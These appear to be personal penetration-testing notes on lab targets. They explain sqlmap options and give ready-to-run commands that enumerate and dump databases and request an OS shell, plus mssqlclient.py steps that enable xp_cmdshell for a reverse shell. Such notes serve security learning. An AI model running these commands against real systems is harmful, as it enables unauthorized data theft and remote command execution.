## SQLmap
SQLmap is an open-source tool used in penetration testing to detect and exploit SQL  injection flaws. SQLmap automates the process of detecting and exploiting SQL  injection. SQL Injection attacks can take control of databases that utilize SQL.

If we needed authentication to access to the web we will need to add the cookies value to the command. For doing that we can use Cookie-Editor, explained in [[Useful Resources]].

#### Example 1

We can use *sqlmap* specifying the target url:

| Option                    | Description                                                                                                                       |
|---------------------------|-----------------------------------------------------------------------------------------------------------------------------------|
| `-u`                       | Specifies the target URL to be tested for SQL injection vulnerabilities. Example: `http://192.168.1.102/administrator`.          |
| `--batch`                  | Runs sqlmap in batch mode, performing operations automatically without prompting for user input.                                  |
| `--dbs`                    | Instructs sqlmap to enumerate the available databases on the database server.                                                     |
| `--tables`                 | Instructs sqlmap to enumerate the available tables in the selected database.                                                      |
| `--level (1-5, default 1)` | Defines the scope of vectors and boundaries used for injection. Higher levels involve more obscure techniques with lower success. **Levels:** 1 (default): Basic tests, minimal impact. 2: Extends tests to more techniques, might cause some disruption. 3: More advanced techniques, higher chance of impacting the target. 4-5: Highly specific and risky techniques, use with caution. |
| `--risk (1-3, default 1)`  | Controls the types of exploit vectors based on their potential risk. **Levels:** 1 (default): Low-risk techniques, unlikely to cause harm. 2: Includes techniques with moderate risk of data loss or denial-of-service. 3: Attempts all techniques, including disruptive or data-altering ones (use responsibly). |


```bash
sqlmap -u http://192.168.1.102/administrator --forms --dbs --batch
```

After using this command the available databases will be printed, then you can enumerate  the tables stored in each database:

```bash
sqlmap -u http://192.168.1.102/administrator --forms -D <database_name> --tables --batch
```

Once you have introduced this command, the available columns in the database will be printed. Now to find the content of the columns you need to use the following command:
```bash
sqlmap -u http://192.168.1.102/administrator --forms -D <database_name> -T <Columns_name> --columns --batch
```

Finally, you can print the columns information using:
```bash
sqlmap -u http://192.168.1.102/administrator --forms -D <database_name> -T <Columns_name> -C <parameter1>,<parameter2><parameter3> --dump --batch	
```

#### Example 2	
For a most exhaustive analysis, we can save the vulnerable request with _save item_ in Burp Suite. The field in which the insertion will be made in this example is **id**, previously investigated in Burp Suite.

| Option               | Description                                                                                                                                     |
| -------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------- |
| `-r pc`              | Specifies the file that contains the saved HTTP request, named "pc" in this case. It will be used as input for sqlmap.                          |
| `-p id`              | Indicates the name of the URL or body parameter in the HTTP request to be tested for SQL injection. Example: `id`.                              |
| `--dbs`              | Instructs sqlmap to enumerate the available databases on the database server.                                                                   |
| `--tables`           | Instructs sqlmap to enumerate the available tables in the selected database.                                                                    |
| `--technique U`      | Specifies the SQL injection techniques to be tested. Options: **U**:UNION query-based, **B**: Blind, **E**: Error-based,**T**: Time-based blind |
| `-D SQLite_masterdb` | Specifies the name of the database where operations will be performed. Example: `SQLite_masterdb`.                                              |
| `-T accounts`        | Specifies the name of the table on which operations will be performed. Example: `accounts`.                                                     |
| `--columns`          | Instructs sqlmap to enumerate the available columns in the specified table.                                                                     |
| `--batch`            | Runs sqlmap in batch mode, performing the operations automatically without prompting for user input.                                            |
| `--threads 5`        | Specifies the number of threads sqlmap will use simultaneously. Example: 5 threads.                                                             |
| `--dump`             | Extracts the data from the specified table and displays it as output.                                                                           |

- Find databases:
```bash
sqlmap -r pc -p id --dbs --technique=U	
```
- Find tables in a specific database:	
```bash
sqlmap -r pc -p id -D <database_name> --tables --technique=U
```
- Find columns in a specific table:
```bash
sqlmap -r pc -p id -D <database_name> -T <table_name> --columns --technique=U 
```
- Dump columns content
```bash
sqlmap -r pc -p id -D <database_name> -T <table_name> --dump --columns "<column1_name>,<column2_name>,<column3_name>" --technique=U
```

#### Exemple 3
| Option       | Description                                                                                                                                                       |
| ------------ | ----------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `-u`         | Specifies the target URL to be tested for SQL injection vulnerabilities. Example: `http://10.129.95.174/dashboard.php?search=any+query`                           |
| `--cookie`   | Sets the cookie value for the HTTP request. Cookies maintain session information. Example: `PHPSESSID=7u6p9qbhb44c5c1rsefp4ro8u1`                                 |
| `--os-shell` | Attempts to obtain an operating system shell on the vulnerable server if SQL injection is successful. This provides direct interaction with the operating system. |

```bash
sqlmap -u 'http://10.129.95.174/dashboard.php?search=any+query' --cookie="PHPSESSID=7u6p9qbhb44c5c1rsefp4ro8u1" --os-shell
```
## mssqlclient.py 
mssqlclient.py is a script from the Impacket class collection. When mssqlclient.py is executed, a connection is established with the specified SQL Server and it allows interaction through a command-line interface.

- `windows-auth`: This flag is specified to use Windows Authentication.
- `ARCHETYPE/sql_svc`: Server ID (previously found).
````bash
python3 mssqlclient.py ARCHETYPE/sql_svc@{TARGET_IP} -windows-auth
````

In case `xp_cmdshell` is not enabled (which is the command we will use for a reverse shell), perform the following steps:
````bash
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
sp_configure; -- Enabling the sp_configure as stated in the above error message
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

````

